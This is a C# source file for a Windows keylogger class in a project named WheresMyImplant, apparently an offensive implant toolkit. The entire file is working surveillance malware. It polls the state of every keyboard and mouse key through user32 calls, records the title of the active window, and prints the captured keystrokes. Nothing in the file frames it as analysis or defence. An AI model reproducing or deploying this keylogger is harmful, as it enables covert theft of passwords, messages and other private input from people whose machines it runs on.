using System;
using System.Linq;
using System.Text;
using System.Threading;

using Unmanaged.Libraries;

namespace WheresMyImplant
{
    class KeyLogger : Base
    {
        private Thread thread;
        private ManualResetEvent exitEvent = new ManualResetEvent(false);
        private static Boolean run = true;

        internal KeyLogger()
        {
            Console.CancelKeyPress += (sender, eventArgs) => {
                eventArgs.Cancel = true;
                exitEvent.Set();
            };
        }

        internal void Execute()
        {
            thread = new Thread(() => Monitor());
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
            exitEvent.WaitOne();
            run = false;
            thread.Join(10);
        }

        [STAThread]
        internal static void Monitor()
        {
            StringBuilder hold = new StringBuilder();
            String holdKey = "";
            while (run)
            {
                StringBuilder title = new StringBuilder();
                IntPtr hWnd = user32.GetForegroundWindow();
                UInt32 titleLength = user32.GetWindowTextLength(hWnd) * 2;
                title.EnsureCapacity((Int32)titleLength);
                user32.GetWindowText(hWnd, title, (UInt32)title.Capacity);

                if (hold.ToString() != title.ToString())
                {
                    Console.WriteLine("\n[[{0}]]",title);
                    hold = title;
                }

                String key = GetKey();
                if (holdKey != key)
                {
                    holdKey = key;
                    Console.Write(key);
                }

                kernel32.CloseHandle(hWnd);
                Thread.Sleep(100);
            }
        }

        private static String GetKey()
        {
            //Get Missing Cases
            if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.KeyCode))
                return "\n[:KeyCode:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Modifiers))
                return "\n[:Modifiers:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.None))
                return "\n[:None:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LButton))
                return "\n[:LMouse:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.RButton))
                return "\n[:RMouse:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Cancel))
                return "\n[:Cancel:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.MButton))
                return "\n[:MButton:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.XButton1))
                return "\n[:XButton1:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.XButton2))
                return "\n[:XButton2:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Back))
                return "\n[:Backspace:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Tab))
                return "\n[:Tab:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LineFeed))
                return "\n[:LineFeed:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Clear))
                return "\n[:Clear:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Return))
                return "\n";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Enter))
                return "\n";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.ShiftKey))
                return "[:Shift:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.ControlKey))
                return "\n[:ControlKey:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Menu))
                return "\n[:Menu:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Pause))
                return "\n[:Pause:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Capital))
                return "\n[:Capital:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.CapsLock))
                return "\n[:CapsLock:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.KanaMode))
                return "\n[:KanaMode:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.HanguelMode))
                return "\n[:HanguelMode:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.HangulMode))
                return "\n[:HangulMode:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.JunjaMode))
                return "\n[:JunjaMode:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.FinalMode))
                return "\n[:FinalMode:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.HanjaMode))
                return "\n[:HanjaMode:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.KanjiMode))
                return "\n[:KanjiMode:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Escape))
                return "\n[:Escape:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.IMEConvert))
                return "\n[:IMEConvert:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.IMENonconvert))
                return "\n[:IMENonconvert:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.IMEAccept))
                return "\n[:IMEAccept:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.IMEAceept))
                return "\n[:IMEAceept:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.IMEModeChange))
                return "\n[:IMEModeChange:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Space))
                return " ";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Prior))
                return "\n[:Prior:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.PageUp))
                return "\n[:PageUp:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Next))
                return "\n[:Next:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.PageDown))
                return "\n[:PageDown:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.End))
                return "\n[:End:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Home))
                return "\n[:Home:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Left))
                return "\n[:Left:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Up))
                return "\n[:Up:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Right))
                return "\n[:Right:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Down))
                return "\n[:Down:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Select))
                return "\n[:Select:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Print))
                return "\n[:Print:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Execute))
                return "\n[:Execute:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Snapshot))
                return "\n[:Snapshot:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.PrintScreen))
                return "\n[:PrintScreen:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Insert))
                return "\n[:Insert:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Delete))
                return "\n[:Delete:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Help))
                return "\n[:Help:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D0))
                return "0";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D1))
                return "1";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D2))
                return "2";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D3))
                return "3";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D4))
                return "4";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D5))
                return "5";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D6))
                return "6";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D7))
                return "7";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D8))
                return "8";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D9))
                return "9";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.A))
                return "a";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.B))
                return "b";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.C))
                return "c";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.D))
                return "d";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.E))
                return "e";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F))
                return "f";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.G))
                return "g";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.H))
                return "h";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.I))
                return "i";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.J))
                return "j";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.K))
                return "k";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.L))
                return "l";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.M))
                return "m";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.N))
                return "n";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.O))
                return "o";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.P))
                return "p";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Q))
                return "q";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.R))
                return "r";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.S))
                return "s";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.T))
                return "t";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.U))
                return "u";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.V))
                return "v";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.W))
                return "w";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.X))
                return "x";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Y))
                return "y";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Z))
                return "z";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LWin))
                return "\n[:LWin:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.RWin))
                return "\n[:RWin:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Apps))
                return "\n[:Apps:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Sleep))
                return "\n[:Sleep:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad0))
                return "0";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad1))
                return "1";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad2))
                return "2";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad3))
                return "3";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad4))
                return "4";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad5))
                return "5";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad6))
                return "6";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad7))
                return "7";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad8))
                return "8";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumPad9))
                return "9";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Multiply))
                return "*";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Add))
                return "+";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Separator))
                return "\n[:Separator:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Subtract))
                return "-";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Decimal))
                return ".";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Divide))
                return "/";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F1))
                return "\n[:F1:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F2))
                return "\n[:F2:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F3))
                return "\n[:F3:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F4))
                return "\n[:F4:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F5))
                return "\n[:F5:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F6))
                return "\n[:F6:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F7))
                return "\n[:F7:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F8))
                return "\n[:F8:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F9))
                return "\n[:F9:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F10))
                return "\n[:F10:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F11))
                return "\n[:F11:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F12))
                return "\n[:F12:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F13))
                return "\n[:F13:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F14))
                return "\n[:F14:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F15))
                return "\n[:F15:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F16))
                return "\n[:F16:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F17))
                return "\n[:F17:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F18))
                return "\n[:F18:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F19))
                return "\n[:F19:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F20))
                return "\n[:F20:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F21))
                return "\n[:F21:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F22))
                return "\n[:F22:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F23))
                return "\n[:F23:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.F24))
                return "\n[:F24:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NumLock))
                return "\n[:NumLock:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Scroll))
                return "\n[:Scroll:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LShiftKey))
                return "[:UnShift:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.RShiftKey))
                return "[:UnShift:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LControlKey))
                return "\n[:LControlKey:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.RControlKey))
                return "\n[:RControlKey:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LMenu))
                return "\n[:LMenu:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.RMenu))
                return "\n[:RMenu:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserBack))
                return "\n[:BrowserBack:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserForward))
                return "\n[:BrowserForward:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserRefresh))
                return "\n[:BrowserRefresh:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserStop))
                return "\n[:BrowserStop:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserSearch))
                return "\n[:BrowserSearch:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserFavorites))
                return "\n[:BrowserFavorites:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.BrowserHome))
                return "\n[:BrowserHome:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.VolumeMute))
                return "\n[:VolumeMute:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.VolumeDown))
                return "\n[:VolumeDown:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.VolumeUp))
                return "\n[:VolumeUp:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.MediaNextTrack))
                return "\n[:MediaNextTrack:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.MediaPreviousTrack))
                return "\n[:MediaPreviousTrack:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.MediaStop))
                return "\n[:MediaStop:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.MediaPlayPause))
                return "\n[:MediaPlayPause:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LaunchMail))
                return "\n[:LaunchMail:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.SelectMedia))
                return "\n[:SelectMedia:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LaunchApplication1))
                return "\n[:LaunchApplication1:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.LaunchApplication2))
                return "\n[:LaunchApplication2:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemSemicolon))
                return ";";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem1))
                return "\n[:Oem1:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oemplus))
                return "\n[:Oemplus:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oemcomma))
                return "\n[:Oemcomma:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemMinus))
                return "\n[:OemMinus:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemPeriod))
                return "\n[:OemPeriod:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemQuestion))
                return "\n[:OemQuestion:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem2))
                return "\n[:Oem2:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oemtilde))
                return "\n[:Oemtilde:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem3))
                return "\n[:Oem3:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemOpenBrackets))
                return "\n[:OemOpenBrackets:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem4))
                return "\n[:Oem4:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemPipe))
                return "\n[:OemPipe:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem5))
                return "\n[:Oem5:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemCloseBrackets))
                return "\n[:OemCloseBrackets:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem6))
                return "\n[:Oem6:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemQuotes))
                return "\"";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem7))
                return "\n[:Oem7:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem8))
                return "\n[:Oem8:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemBackslash))
                return "\n[:OemBackslash:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Oem102))
                return "\n[:Oem102:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.ProcessKey))
                return "\n[:ProcessKey:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Packet))
                return "\n[:Packet:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Attn))
                return "\n[:Attn:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Crsel))
                return "\n[:Crsel:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Exsel))
                return "\n[:Exsel:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.EraseEof))
                return "\n[:EraseEof:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Play))
                return "\n[:Play:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Zoom))
                return "\n[:Zoom:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.NoName))
                return "\n[:NoName:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Pa1))
                return "\n[:Pa1:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.OemClear))
                return "\n[:OemClear:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Shift))
                return "\n[:Shift:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Control))
                return "\n[:Control:]";
            else if (0 != user32.GetAsyncKeyState(System.Windows.Forms.Keys.Alt))
                return "\n[:Alt:]";
            else
                return "";
        }

        public void Dispose()
        {

        }

        ~KeyLogger()
        {
            Dispose();
        }
    }
}
